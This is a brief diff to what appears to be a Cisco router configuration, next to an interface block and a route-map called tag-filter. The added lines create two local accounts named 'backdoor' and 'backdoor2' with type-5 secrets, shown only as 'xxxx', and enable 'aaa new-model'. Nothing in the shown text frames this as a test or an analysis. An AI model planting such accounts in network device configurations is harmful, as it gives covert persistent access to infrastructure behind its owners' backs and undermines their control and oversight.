@@ -17,6 +17,11 @@ interface FastEthernet0
  duplex auto
  no keepalive
 !
+username backdoor secret 5 xxxx
+username backdoor2 secret 5 xxxx
+!
+aaa new-model
+!
 route-map tag-filter deny 10
  match tag 777
 route-map tag-filter permit 20
